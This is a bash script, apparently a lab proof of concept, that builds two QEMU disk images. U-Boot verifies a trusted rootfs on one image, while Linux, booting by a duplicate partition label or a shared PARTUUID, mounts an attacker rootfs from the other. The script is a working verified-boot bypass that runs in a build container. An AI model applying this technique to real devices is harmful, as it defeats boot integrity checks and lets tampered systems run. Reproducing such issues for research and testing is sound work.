#!/usr/bin/env bash
# Craft the two-disk PARTLABEL bypass. Runs inside the build container.
#
# Enumeration (measured for qemu virt + virtio-mmio; U-Boot and Linux AGREE):
#   disk.img  = QEMU hd0 -> U-Boot virtio 1 / Linux vdb   ("golden system disk")
#   disk2.img = QEMU hd1 -> U-Boot virtio 0 / Linux vda   ("attacker disk", enumerated first)
#
# Both carry a partition labelled 'rootfs'. The divergence is by POLICY, not order:
#   - U-Boot verifies 'rootfs' on the golden disk it trusts (virtio 1 = disk.img = GOOD).
#   - Linux resolves root=PARTLABEL=rootfs to the FIRST match = vda (disk2.img = EVIL).
# So U-Boot validates one disk while Linux mounts another. The boot slot lives on
# virtio 0 (disk2.img) because U-Boot's bootcmd sources `virtio 0:2`.
# Output: out/image/disk.img + out/image/disk2.img
set -euo pipefail

OUT=out/image; mkdir -p "$OUT"
DISK="$OUT/disk.img"; DISK2="$OUT/disk2.img"
KERNEL=out/kernel/Image; EVIL=out/rootfs/evil.img; GOOD=out/rootfs/good.img
for f in "$KERNEL" "$EVIL" "$GOOD"; do [ -f "$f" ] || { echo "missing $f"; exit 1; }; done
GOODHASH="$(sha256sum rootfs/good/etc/rootfs-id | awk '{print $1}')"

# MODE=partlabel (default): both 'rootfs' partitions get auto (distinct) GUIDs; Linux
#   roots by PARTLABEL=rootfs.
# MODE=partuuid: both 'rootfs' partitions share the SAME unique GUID X across the two
#   drives (the issue's "duplicate PARTUUID ... on another drive"); root=PARTUUID=X.
MODE="${1:-partlabel}"
GUID_X="11111111-2222-3333-4444-555555555555"
case "$MODE" in
  partlabel) ROOTSPEC="PARTLABEL=rootfs"; GOPT=(); EOPT=() ;;
  partuuid)  ROOTSPEC="PARTUUID=${GUID_X,,}"; GOPT=(-u 1:"$GUID_X"); EOPT=(-u 1:"$GUID_X") ;;
  *) echo "unknown mode: $MODE (partlabel|partuuid)"; exit 2 ;;
esac

# boot.scr: kernel from virtio 0:2; verify golden rootfs on virtio 1; root=PARTLABEL=rootfs
stage="$(mktemp -d)"; cp "$KERNEL" "$stage/Image"
sed -e "s/@@GOODHASH@@/$GOODHASH/g" -e "s#@@ROOTSPEC@@#$ROOTSPEC#g" uboot/boot-mldisk.cmd > "$stage/boot.cmd"
mkimage -A arm64 -O linux -T script -C none -n partguid-mldisk \
    -d "$stage/boot.cmd" "$stage/boot.scr" >/dev/null
rm -f "$OUT/boot.img"; mke2fs -q -t ext4 -b 4096 -L boot -d "$stage" "$OUT/boot.img" 96M; rm -rf "$stage"

first_lba(){ sgdisk -i "$1" "$2" | awk '/First sector/{print $3}'; }

# disk.img = hd0 = U-Boot virtio 1 / Linux vdb : GOLDEN rootfs (what U-Boot verifies)
rm -f "$DISK"; truncate -s 64M "$DISK"; sgdisk -Z "$DISK" >/dev/null
sgdisk -n 1:0:+48M -t 1:8300 -c 1:rootfs "${GOPT[@]}" "$DISK" >/dev/null
dd if="$GOOD" of="$DISK" bs=512 seek="$(first_lba 1 "$DISK")" conv=notrunc status=none
echo "[mldisk] disk.img  (hd0 -> virtio 1 / vdb): p1 'rootfs'=GOOD  (U-Boot verifies this)"

# disk2.img = hd1 = U-Boot virtio 0 / Linux vda : ATTACKER rootfs + boot slot
rm -f "$DISK2"; truncate -s 224M "$DISK2"; sgdisk -Z "$DISK2" >/dev/null
sgdisk -n 1:0:+48M  -t 1:8300 -c 1:rootfs "${EOPT[@]}" \
       -n 2:0:+128M -t 2:8300 -c 2:boot "$DISK2" >/dev/null
dd if="$EVIL"         of="$DISK2" bs=512 seek="$(first_lba 1 "$DISK2")" conv=notrunc status=none
dd if="$OUT/boot.img" of="$DISK2" bs=512 seek="$(first_lba 2 "$DISK2")" conv=notrunc status=none
echo "[mldisk] disk2.img (hd1 -> virtio 0 / vda): p1 'rootfs'=EVIL, p2 boot  (Linux mounts vda first)"

echo "EVIL" > "$OUT/EXPECT"
echo "[mldisk] mode=$MODE root=$ROOTSPEC  (expect: U-Boot verifies virtio 1/GOOD, Linux mounts vda/EVIL)"
